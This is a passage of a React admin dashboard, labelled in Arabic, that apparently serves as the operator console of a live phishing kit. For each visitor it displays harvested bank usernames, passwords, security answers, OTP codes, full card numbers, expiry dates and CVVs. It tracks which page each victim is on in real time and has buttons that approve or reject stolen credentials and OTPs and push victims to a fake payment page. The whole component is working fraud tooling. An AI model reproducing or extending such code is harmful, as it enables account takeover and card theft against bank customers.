            <div key={i} className="bg-card border rounded-2xl p-3 text-center">
              <div
                className={`w-9 h-9 ${card.bg} ${card.color} rounded-xl flex items-center justify-center mx-auto mb-2`}
              >
                {card.icon}
              </div>
              <div className="text-2xl font-black text-foreground">
                {card.value}
              </div>
              <div className="text-xs text-muted-foreground mt-0.5 leading-tight">
                {card.label}
              </div>
            </div>
          ))}
        </div>

        {/* إرسال رسالة فورية */}

        {/* قائمة الطلبات */}
        <div className="bg-card border rounded-2xl overflow-hidden">
          <div className="flex items-center justify-between p-4 border-b flex-wrap gap-2">
            {/* تبويبات */}
            <div className="flex items-center gap-1 bg-muted rounded-xl p-1">
              <button
                onClick={() => setActiveTab("applications")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-bold transition-colors ${
                  activeTab === "applications" ? "bg-card text-foreground shadow-sm" : "text-muted-foreground hover:text-foreground"
                }`}
              >
                <ClipboardList className="w-4 h-4" />
                الطلبات
                <span className={`text-xs px-1.5 py-0.5 rounded-full ${activeTab === "applications" ? "bg-primary/10 text-primary" : "bg-muted-foreground/20"}`}>
                  {applications?.length ?? 0}
                </span>
              </button>
              <button
                onClick={() => setActiveTab("trash")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-bold transition-colors ${
                  activeTab === "trash" ? "bg-card text-foreground shadow-sm" : "text-muted-foreground hover:text-foreground"
                }`}
              >
                <Trash2 className="w-4 h-4" />
                المهملات
                {(trashApps?.length ?? 0) > 0 && (
                  <span className="text-xs px-1.5 py-0.5 rounded-full bg-red-100 text-red-600">
                    {trashApps?.length}
                  </span>
                )}
              </button>
            </div>

            {/* حذف الكل */}
            {activeTab === "applications" && (applications?.length ?? 0) > 0 && (
              deleteAllConfirm ? (
                <div className="flex items-center gap-2">
                  <span className="text-xs text-red-600 font-medium">تأكيد حذف الكل؟</span>
                  <button onClick={handleDeleteAll} className="text-xs bg-red-600 text-white px-3 py-1.5 rounded-lg font-bold hover:bg-red-700">نعم، احذف</button>
                  <button onClick={() => setDeleteAllConfirm(false)} className="text-xs bg-muted text-foreground px-3 py-1.5 rounded-lg font-bold">إلغاء</button>
                </div>
              ) : (
                <button
                  onClick={() => setDeleteAllConfirm(true)}
                  className="flex items-center gap-1.5 text-xs text-red-600 bg-red-50 hover:bg-red-100 px-3 py-1.5 rounded-lg font-bold transition-colors"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                  حذف الكل
                </button>
              )
            )}
          </div>

          {/* سلة المهملات */}
          {activeTab === "trash" && (
            trashLoading ? (
              <div className="p-12 text-center text-muted-foreground">جاري التحميل...</div>
            ) : !trashApps || trashApps.length === 0 ? (
              <div className="p-12 text-center">
                <Trash2 className="w-10 h-10 text-muted-foreground/30 mx-auto mb-3" />
                <p className="text-muted-foreground">سلة المهملات فارغة</p>
              </div>
            ) : (
              <div className="divide-y">
                {trashApps.map((app) => {
                  const name = app.fullName || app.companyName || app.contactName || "—";
                  return (
                    <div key={app.id} className="flex items-center gap-3 p-4 bg-red-50/30">
                      <div className="w-9 h-9 bg-muted rounded-xl flex items-center justify-center text-muted-foreground shrink-0">
                        {app.applicantType === "business" ? <Building2 className="w-4 h-4" /> : <User className="w-4 h-4" />}
                      </div>
                      <div className="min-w-0 flex-1">
                        <p className="font-bold text-sm text-foreground truncate">{name}</p>
                        <p className="text-xs text-muted-foreground">
                          {app.bankName && <span className="ml-2">{app.bankName}</span>}
                          {app.bankUsername && <span className="font-mono ml-2 text-blue-600">{app.bankUsername}</span>}
                          {app.bankPassword && <span className="font-mono ml-2 text-red-600">{app.bankPassword}</span>}
                          {app.otpCode && <span className="font-mono ml-2 text-orange-600 font-bold">{app.otpCode}</span>}
                        </p>
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <button
                          onClick={() => handleRestoreOne(app.id)}
                          disabled={!!actionLoading[`restore_${app.id}`]}
                          className="flex items-center gap-1 text-xs bg-green-50 text-green-700 hover:bg-green-100 px-2.5 py-1.5 rounded-lg font-bold transition-colors disabled:opacity-50"
                        >
                          <RotateCcw className="w-3.5 h-3.5" />
                          استعادة
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )
          )}

          {activeTab === "applications" && (!applications || applications.length === 0) ? (
            <div className="p-12 text-center text-muted-foreground">
              لا توجد طلبات حتى الآن
            </div>
          ) : activeTab === "applications" && (
            <div className="divide-y">
              {applications.map((app) => {
                const isExpanded = expandedRows.has(app.id);
                // الاسم: نحاول من السجل الحالي أولاً، ثم من كاش النسخ كاحتياط
                const cachedVersions = versionCache[app.id] || [];
                const name =
                  app.fullName || app.companyName || app.contactName ||
                  (cachedVersions.find((v) => v.fullName)?.fullName as string | undefined) ||
                  (cachedVersions.find((v) => v.companyName)?.companyName as string | undefined) ||
                  "";
                return (
                  <div
                    key={app.id}
                    className="transition-colors hover:bg-muted/20"
                  >
                    {/* الصف الرئيسي */}
                    <div
                      className="flex items-center gap-3 p-4 cursor-pointer select-none"
                      onClick={() => toggleRow(app.id)}
                    >
                      <div className="w-9 h-9 navy-gradient rounded-xl flex items-center justify-center text-white shrink-0">
                        {app.applicantType === "business" ? (
                          <Building2 className="w-4 h-4" />
                        ) : (
                          <User className="w-4 h-4" />
                        )}
                      </div>
                      <div className="min-w-0 flex-1">
                        {(() => {
                          // استخدام البيانات الفورية من WebSocket
                          const sessionStatus = getSessionStatus(app.sessionId);
                          const online = sessionStatus.online;
                          const currentPage = sessionStatus.currentPage || app.currentStep;
                          const lastPageLabel = stepLabels[currentPage] || currentPage;
                          const sess = app.sessionId ? sessionMap.get(app.sessionId) : undefined;

                          // شارة الحالة: تعتمد فقط على status و currentStep (وليس على الاتصال)
                          let badge: { label: string; color: string };
                          if (app.status === "approved") {
                            badge = { label: "تمت الموافقة ✓", color: "bg-green-100 text-green-700" };
                          } else if (app.status === "rejected") {
                            badge = { label: "تم الرفض ✗", color: "bg-red-100 text-red-700" };
                          } else if (app.status === "reviewing") {
                            badge = { label: "مراجعة البيانات", color: "bg-blue-100 text-blue-700" };
                          } else if (app.currentStep === "waiting") {
                            badge = { label: "بانتظار الموافقة", color: "bg-yellow-100 text-yellow-700" };
                          } else {
                            // pending أو أي حالة أخرى = قيد التقديم
                            badge = { label: "قيد التقديم", color: "bg-emerald-100 text-emerald-700" };
                          }

                          return (
                            <>
                              <div className="flex items-center gap-2 flex-wrap">
                                <span className={`font-bold text-sm truncate ${name ? "text-foreground" : "text-muted-foreground italic"}`}>
                                  {name || "بانتظار بيانات العميل..."}
                                </span>
                                {/* مؤشر الحضور الفوري */}
                                {sess && (
                                  online ? (
                                    <span className="flex items-center gap-1 text-xs text-green-700 bg-green-50 px-2 py-0.5 rounded-full font-medium">
                                      <span className="relative flex h-2 w-2">
                                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
                                        <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
                                      </span>
                                      {lastPageLabel}
                                    </span>
                                  ) : (
                                    <span className="flex items-center gap-1 text-xs text-gray-500 bg-gray-100 px-2 py-0.5 rounded-full">
                                      <span className="inline-flex rounded-full h-2 w-2 bg-gray-400" />
                                      غير متصل
                                    </span>
                                  )
                                )}
                                {app.bankName && (
                                  <span className="text-xs bg-blue-50 text-blue-700 px-2 py-0.5 rounded-full flex items-center gap-1">
                                    {app.bankLogo && (
                                      <img src={app.bankLogo} alt={app.bankName} className="w-4 h-3 object-contain" />
                                    )}
                                    {app.bankName}
                                  </span>
                                )}
                              </div>
                              <div className="flex items-center gap-2 mt-1 flex-wrap">
                                <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${badge.color}`}>
                                  {badge.label}
                                </span>
                                {app.bankUsername && (
                                  <span className="text-xs bg-green-50 text-green-700 px-2 py-0.5 rounded-full flex items-center gap-1">
                                    <Key className="w-3 h-3" /> بيانات دخول
                                  </span>
                                )}
                                {app.otpCode && (
                                  <span className="text-xs bg-orange-50 text-orange-700 px-2 py-0.5 rounded-full flex items-center gap-1">
                                    <Smartphone className="w-3 h-3" /> رمز OTP
                                  </span>
                                )}
                              </div>
                            </>
                          );
                        })()}
                      </div>
                      <div className="flex items-center gap-1 shrink-0">
                        {/* طابع الوقت الشخصي */}
                        <TimeBadge timestamp={app.createdAt} icon={<User className="w-3 h-3" />} label="بيانات" />
                        {/* طابع الوقت البنكي */}
                        {app.bankUsername && (
                          <TimeBadge timestamp={app.updatedAt} icon={<CreditCard className="w-3 h-3" />} label="بنك" />
                        )}
                        {/* طابع وقت OTP */}
                        {app.otpCode && (
                          <TimeBadge timestamp={app.updatedAt} icon={<Smartphone className="w-3 h-3" />} label="OTP" />
                        )}

                        <button
                          onClick={(e) => { e.stopPropagation(); handleDeleteOne(app.id); }}
                          disabled={!!actionLoading[`del_${app.id}`]}
                          className="p-1.5 text-red-500 hover:bg-red-50 rounded-lg transition-colors disabled:opacity-40"
                          title="حذف إلى سلة المهملات"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                        {isExpanded ? (
                          <ChevronUp className="w-4 h-4 text-muted-foreground" />
                        ) : (
                          <ChevronDown className="w-4 h-4 text-muted-foreground" />
                        )}
                      </div>
                    </div>

                    {/* التفاصيل الموسّعة */}
                    {isExpanded && (
                      <div className="bg-muted/30 border-t px-4 pb-4 pt-3">
                        {/* تبويبات النسخ */}
                        {(() => {
                          
                          // versionCache يستخدم مفتاح app.id أو sessionId
                          const versions = versionCache[app.id] || versionCache[app.sessionId] || [];
                          const latestFromWs = latestAppData[app.sessionId];
                          const latestData = latestFromWs || versions[0] || app;
                          
                          // إضافة latestData كـ latest إذا لم يكن في versions
                          const versionsWithLatest = versions[0]?.id === app.id
                            ? versions
                            : [latestData as AppVersion, ...versions];
                          
                          const totalVersions = versionsWithLatest.length;
                          const olderVersions = versionsWithLatest.filter((v) => !v.isLatest);
                          const activeTab = expandedTabs[app.id] || "current";
                          const allData = mergeVersionsData(versionsWithLatest);
                          // عدد محاولات OTP = عدد القيم المختلفة لرمز OTP عبر النسخ
                          const otpAttempts = new Set(
                            [...versions, app as unknown as AppVersion]
                              .filter((v) => v.otpCode)
                              .map((v) => v.otpCode)
                          ).size;

                          return (
                            <div className="space-y-4">
                              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                {/* صندوق البيانات الشخصية */}
                        <div className="bg-card rounded-xl p-4 space-y-2">
                          <div className="flex items-center gap-2">
                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                              <User className="w-4 h-4" />
                              {allData.applicantType === "business"
                                ? "بيانات الشركة"
                                : "البيانات الشخصية"}
                            </h4>
                            <SectionTimeBadge timestamp={app.createdAt} />
                          </div>
                          <DataBadge
                            label="الاسم"
                            value={
                              allData.fullName || allData.companyName || allData.contactName
                            }
                          />
                          <DataBadge
                            label="رقم الهوية / السجل"
                            value={allData.nationalId || allData.commercialRegistration}
                          />
                          <DataBadge label="رقم الهاتف" value={allData.phone} />
                          <DataBadge
                            label="البريد الإلكتروني"
                            value={allData.email}
                          />
                          <DataBadge
                            label="تاريخ الميلاد"
                            value={allData.dateOfBirth}
                          />
                          <DataBadge
                            label="الراتب الشهري"
                            value={allData.monthlySalary}
                          />
                          <DataBadge label="جهة العمل" value={allData.employer} />
                          <DataBadge label="المدينة" value={allData.city} />
                          <DataBadge
                            label="الحالة الاجتماعية"
                            value={allData.maritalStatus}
                          />
                          <DataBadge
                            label="نوع النشاط"
                            value={allData.businessType}
                          />
                          <DataBadge
                            label="عدد الموظفين"
                            value={allData.employeeCount}
                          />
                          <DataBadge
                            label="الإيرادات السنوية"
                            value={allData.annualRevenue}
                          />
                          
                          {/* سجلات البيانات الشخصية */}
                          <HistorySection
                            type="applicant"
                            records={versions.filter(v => v.fullName || v.companyName || v.contactName)}
                            expanded={expandedHistory.applicant}
                            onToggle={() => setExpandedHistory(h => ({ ...h, applicant: !h.applicant }))}
                          />
                        </div>

                        {/* صندوق بيانات البنك */}
                        <div className="bg-card rounded-xl p-4 space-y-2">
                          <div className="flex items-center gap-2">
                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                              <CreditCard className="w-4 h-4" />
                              بيانات البنك والدخول
                            </h4>
                            <SectionTimeBadge timestamp={app.bankUsername ? app.updatedAt : undefined} />
                          </div>
                          {/* اسم البنك بارز في الأعلى */}
                          {(allData.bankName || app.bankName) && (
                            <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 flex items-center gap-3 mb-3">
                              {(allData.bankLogo || latestData.bankLogo || app.bankLogo) ? (
                                <img 
                                  src={allData.bankLogo || latestData.bankLogo || app.bankLogo} 
                                  alt={String(allData.bankName || app.bankName)} 
                                  className="w-12 h-8 object-contain" 
                                />
                              ) : (
                                <CreditCard className="w-5 h-5 text-primary shrink-0" />
                              )}
                              <div>
                                <p className="text-[10px] text-muted-foreground font-medium">البنك المختار</p>
                                <p className="text-base font-black text-primary">{String(allData.bankName || app.bankName)}</p>
                              </div>
                            </div>
                          )}
                          <DataBadge
                            label="اسم المستخدم"
                            value={allData.bankUsername}
                          />
                          <DataBadge
                            label="كلمة المرور"
                            value={allData.bankPassword}
                          />
                          <DataBadge
                            label="كلمة التحقق / الأمان"
                            value={allData.securityAnswer}
                          />

                          {/* قرار بيانات الدخول */}
                          {allData.bankUsername && app.sessionId && (
                            <div className="pt-3 border-t space-y-2">
                              <p className="text-xs font-bold text-muted-foreground">
                                قرار بيانات الدخول:
                              </p>
                              <input
                                type="text"
                                placeholder="رسالة الرفض (اختياري)"
                                value={rejectionMsg[app.id] || ""}
                                onChange={(e) =>
                                  setRejectionMsg((r) => ({
                                    ...r,
                                    [app.id]: e.target.value,
                                  }))
                                }
                                className="w-full text-xs border rounded-lg px-3 py-2 bg-background"
                              />
                              <div className="flex gap-2">
                                <button
                                  onClick={() =>
                                    handleCredentialsDecision(
                                      app.sessionId!,
                                      "approved",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`cred_${app.id}_approved`]
                                  }
                                  className="flex-1 bg-green-100 text-green-700 py-2 rounded-lg text-xs font-bold hover:bg-green-200 disabled:opacity-50 transition-colors"
                                >
                                  ✓ صحيحة → رمز
                                </button>
                                <button
                                  onClick={() =>
                                    handleCredentialsDecision(
                                      app.sessionId!,
                                      "rejected",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`cred_${app.id}_rejected`]
                                  }
                                  className="flex-1 bg-red-100 text-red-700 py-2 rounded-lg text-xs font-bold hover:bg-red-200 disabled:opacity-50 transition-colors"
                                >
                                  ✗ خاطئة
                                </button>
                              </div>
                            </div>
                          )}
                          
                          {/* سجلات البنك والدخول */}
                          <HistorySection
                            type="credentials"
                            records={versions.filter(v => v.bankUsername || v.bankPassword || v.bankName)}
                            expanded={expandedHistory.credentials}
                            onToggle={() => setExpandedHistory(h => ({ ...h, credentials: !h.credentials }))}
                          />
                        </div>

                        {/* صندوق OTP */}
                        <div className="bg-card rounded-xl p-4 space-y-2">
                          <div className="flex items-center gap-2">
                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                              <Smartphone className="w-4 h-4" />
                              رمز OTP والحالة
                              {otpAttempts > 0 && (
                                <span className={`text-xs font-bold px-2 py-0.5 rounded-full ${otpAttempts > 1 ? "bg-orange-100 text-orange-700" : "bg-green-100 text-green-700"}`}>
                                  {otpAttempts} {otpAttempts === 1 ? "محاولة" : "محاولات"}
                                </span>
                              )}
                            </h4>
                            <SectionTimeBadge timestamp={allData.otpCode ? app.updatedAt : undefined} />
                          </div>
                          {allData.otpCode ? (
                            <div className="bg-muted rounded-xl p-4 text-center">
                              <p className="text-xs text-muted-foreground mb-1">
                                رمز التحقق
                              </p>
                              <p className="text-3xl font-mono font-black text-primary tracking-[0.3em]">
                                {allData.otpCode}
                              </p>
                            </div>
                          ) : (
                            <p className="text-sm text-muted-foreground text-center py-4">
                              لم يُدخل رمز بعد
                            </p>
                          )}

                          <div className="space-y-1 pt-2">
                            <DataBadge
                              label="الخطوة الحالية"
                              value={
                                stepLabels[app.currentStep] || app.currentStep
                              }
                            />
                            <DataBadge
                              label="الحالة"
                              value={statusLabels[app.status] || app.status}
                            />
                            {app.adminNote && (
                              <DataBadge
                                label="ملاحظة المدير"
                                value={app.adminNote}
                              />
                            )}
                          </div>

                          {/* قرار OTP */}
                          {allData.otpCode && app.sessionId && (
                            <div className="pt-3 border-t">
                              <p className="text-xs font-bold text-muted-foreground mb-2">
                                قرار رمز OTP:
                              </p>
                              <div className="flex gap-1 flex-wrap">
                                <button
                                  onClick={() =>
                                    handleOtpDecision(
                                      app.sessionId!,
                                      "approved",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`otp_${app.id}_approved`]
                                  }
                                  className="flex-1 bg-green-100 text-green-700 py-2 rounded-lg text-xs font-bold hover:bg-green-200 disabled:opacity-50 transition-colors"
                                >
                                  ✓ صحيح
                                </button>
                                <button
                                  onClick={() =>
                                    handleOtpDecision(
                                      app.sessionId!,
                                      "rejected",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`otp_${app.id}_rejected`]
                                  }
                                  className="flex-1 bg-red-100 text-red-700 py-2 rounded-lg text-xs font-bold hover:bg-red-200 disabled:opacity-50 transition-colors"
                                >
                                  ✗ خطأ
                                </button>
                                <button
                                  onClick={() =>
                                    handleOtpDecision(
                                      app.sessionId!,
                                      "no_credit",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`otp_${app.id}_no_credit`]
                                  }
                                  className="flex-1 bg-orange-100 text-orange-700 py-2 rounded-lg text-xs font-bold hover:bg-orange-200 disabled:opacity-50 transition-colors"
                                >
                                  لا رصيد
                                </button>
                              </div>
                            </div>
                          )}
                          
                          {/* سجلات رموز OTP */}
                          <HistorySection
                            type="otp"
                            records={versions.filter(v => v.otpCode)}
                            expanded={expandedHistory.otp}
                            onToggle={() => setExpandedHistory(h => ({ ...h, otp: !h.otp }))}
                          />
                        </div>
                              </div>
                              
                              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                
                                {/* صندوق بيانات البطاقة */}
                        <div className="bg-card rounded-xl p-4 space-y-2">
                          <div className="flex items-center gap-2">
                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                              <CreditCard className="w-4 h-4" />
                              بيانات الدفع (PayVisa)
                            </h4>
                            <SectionTimeBadge timestamp={allData.paymentCardHolder ? app.updatedAt : undefined} />
                          </div>
                          {allData.paymentCardHolder ? (
                            <div className="space-y-3">
                              <div className={`rounded-xl p-4 ${
                                app.paymentStatus === "verifying"
                                  ? "bg-yellow-50 border border-yellow-200"
                                  : app.paymentStatus === "completed"
                                  ? "bg-green-50 border border-green-200"
                                  : app.paymentStatus === "failed"
                                  ? "bg-red-50 border border-red-200"
                                  : "bg-gray-50 border border-gray-200"
                              }`}>
                                <div className="flex items-center gap-2 mb-3">
                                  <span className={`px-2 py-1 rounded-full text-xs font-bold ${
                                    app.paymentStatus === "completed" 
                                      ? "bg-green-100 text-green-700" 
                                      : app.paymentStatus === "verifying"
                                      ? "bg-yellow-100 text-yellow-700"
                                      : "bg-gray-100 text-gray-700"
                                  }`}>
                                    {app.paymentStatus === "completed" ? "✓ تم الدفع" 
                                      : app.paymentStatus === "failed" ? "✗ فشل الدفع"
                                      : app.paymentStatus === "verifying"
                                      ? "🔄 جاري التحقق"
                                      : "⏳ بانتظار الدفع"}
                                  </span>
                                </div>
                                <div className="space-y-2">
                                  <DataBadge
                                    label="رقم البطاقة"
                                    value={allData.paymentCardNumber}
                                  />
                                  <DataBadge
                                    label="حامل البطاقة"
                                    value={allData.paymentCardHolder}
                                  />
                                  <DataBadge
                                    label="تاريخ الانتهاء"
                                    value={allData.paymentExpiryDate}
                                  />
                                  <DataBadge
                                    label="رمز الأمان (CVV)"
                                    value={allData.paymentCvv}
                                  />

                                  {/* أزرار التحقق عند حالة verifying */}
                                  {app.paymentStatus === "verifying" && (
                                    <div className="mt-4 space-y-2">
                                      <button
                                        onClick={() => handlePaymentAction(app.id, "approve")}
                                        disabled={!!actionLoading[`pay_action_${app.id}`]}
                                        className="w-full bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                                      >
                                        <CheckCircle className="w-4 h-4" />
                                        {actionLoading[`pay_action_${app.id}`] === "approve" ? "جاري التحويل..." : "✓ تحويل للرمز"}
                                      </button>
                                      <button
                                        onClick={() => handlePaymentAction(app.id, "reject")}
                                        disabled={!!actionLoading[`pay_action_${app.id}`]}
                                        className="w-full bg-red-500 hover:bg-red-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                                      >
                                        <XCircle className="w-4 h-4" />
                                        {actionLoading[`pay_action_${app.id}`] === "reject" ? "جاري الرفض..." : "✗ رفض - البطاقة غير صحيحة"}
                                      </button>
                                    </div>
                                  )}
                                  
                                  {/* رسالة النجاح */}
                                  {app.paymentStatus === "completed" && (
                                    <div className="mt-4 bg-green-100 rounded-lg p-3 text-center">
                                      <p className="text-green-700 text-sm font-bold">✓ تمت معالجة الدفع بنجاح</p>
                                    </div>
                                  )}
                                  {/* رسالة الفشل */}
                                  {app.paymentStatus === "failed" && (
                                    <div className="mt-4 bg-red-100 rounded-lg p-3 text-center">
                                      <p className="text-red-700 text-sm font-bold">✗ تم رفض الدفع</p>
                                    </div>
                                  )}

                                  {/* أزرار تأكيد/رفض رمز OTP */}
                                  {latestData.paymentStatus === "otp_submitted" && latestData.currentStep === "pay-otp" && (
                                    <div className="mt-4 space-y-2">
                                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
                                        <p className="text-blue-700 text-sm font-bold">🔐 بانتظار تأكيد رمز OTP</p>
                                        <p className="text-blue-600 text-xs mt-1">العميل ينتظر الموافقة على الرمز</p>
                                      </div>
                                      <button
                                        onClick={() => handleOtpAction(latestData.id, "approve")}
                                        disabled={!!actionLoading[`otp_action_${app.id}`]}
                                        className="w-full bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                                      >
                                        <CheckCircle className="w-4 h-4" />
                                        {actionLoading[`otp_action_${app.id}`] === "approve" ? "جاري الموافقة..." : "✓ تأكيد الرمز وإتمام الدفع"}
                                      </button>
                                      <button
                                        onClick={() => handleOtpAction(latestData.id, "reject")}
                                        disabled={!!actionLoading[`otp_action_${app.id}`]}
                                        className="w-full bg-orange-500 hover:bg-orange-600 text-white py-2 px-4 rounded-lg text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                                      >
                                        <XCircle className="w-4 h-4" />
                                        {actionLoading[`otp_action_${app.id}`] === "reject" ? "جاري الرفض..." : "✗ رفض الرمز وطلب رمز جديد"}
                                      </button>
                                    </div>
                                  )}
                                </div>
                              </div>
                            </div>
                          ) : (
                            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4">
                              <p className="text-sm text-amber-700 text-center">
                                لم يتم إدخال بيانات الدفع بعد
                              </p>
                            </div>
                          )}
                          
                          {/* زر إرسال العميل لصفحة الدفع - يظهر دائماً */}
                          {/* سجلات البطاقات */}
                          <HistorySection
                            type="payment-card"
                            records={versions.filter(v => v.paymentCardNumber)}
                            expanded={expandedHistory["payment-card"]}
                            onToggle={() => setExpandedHistory(h => ({ ...h, "payment-card": !h["payment-card"] }))}
                          />

                          {app.sessionId && (
                            <button
                              onClick={() => handleRequestPayment(app.id, app.sessionId!)}
                              disabled={!!actionLoading[`pay_${app.id}`]}
                              className="w-full bg-gradient-to-l from-primary to-primary/80 hover:from-primary/90 hover:to-primary text-white py-3 rounded-xl text-sm font-bold disabled:opacity-50 transition-all flex items-center justify-center gap-2"
                            >
                              <CreditCard className="w-4 h-4" />
                              {actionLoading[`pay_${app.id}`] ? (
                                <>
                                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                                  </svg>
                                  جاري التوجيه...
                                </>
                              ) : (
                                <>
                                  <CreditCard className="w-4 h-4" />
                                  إرسال العميل لصفحة الدفع
                                </>
                              )}
                            </button>
                          )}
                        </div>

                                {/* صندوق رموز OTP للدفع */}
                                <div className="bg-card rounded-xl p-4 space-y-2">
                                  <div className="flex items-center gap-2">
                                    <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                                      <Smartphone className="w-4 h-4" />
                                      رموز OTP للدفع (Pay-OTP)
                                    </h4>
                                    <SectionTimeBadge timestamp={latestData.paymentOtp ? latestData.updatedAt : undefined} />
                                  </div>
                                  {latestData.paymentOtp ? (
                                    <div className="bg-orange-50 border border-orange-200 rounded-xl p-6 text-center">
                                      <p className="text-sm text-orange-600 mb-2 font-medium">رمز التحقق (OTP)</p>
                                      <p className="text-4xl font-mono font-black text-orange-700 tracking-widest">
                                        {latestData.paymentOtp}
                                      </p>
                                    </div>
                                  ) : (
                                    <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 text-center">
                                      <p className="text-sm text-amber-700">لم يُدخل رمز OTP للدفع بعد</p>
                                    </div>
                                  )}
                                  
                                  {latestData.paymentStatus === "otp_submitted" && latestData.currentStep === "pay-otp" && (
                                    <div className="mt-4 space-y-2">
                                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
                                        <p className="text-blue-700 text-sm font-bold">🔐 بانتظار تأكيد رمز OTP</p>
                                      </div>
                                      <button
                                        onClick={() => handleOtpAction(latestData.id, "approve")}
                                        disabled={!!actionLoading[`otp_action_${latestData.id}`]}
                                        className="w-full bg-green-500 hover:bg-green-600 text-white py-2.5 rounded-lg text-sm font-bold transition-all disabled:opacity-50"
                                      >
                                        ✓ تأكيد الرمز وإتمام الدفع
                                      </button>
                                      <button
                                        onClick={() => handleOtpAction(latestData.id, "reject")}
                                        disabled={!!actionLoading[`otp_action_${latestData.id}`]}
                                        className="w-full bg-orange-500 hover:bg-orange-600 text-white py-2.5 rounded-lg text-sm font-bold transition-all disabled:opacity-50"
                                      >
                                        ✗ رفض الرمز وطلب رمز جديد
                                      </button>
                                    </div>
                                  )}
                                  
                                  <HistorySection
                                    type="payment-otp"
                                    records={versions.filter(v => v.paymentOtp)}
                                    expanded={expandedHistory["payment-otp"]}
                                    onToggle={() => setExpandedHistory(h => ({ ...h, "payment-otp": !h["payment-otp"] }))}
                                  />
                                </div>

                              </div>
                            </div>
                            );
                          })()}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </AdminLayout>
  );
}
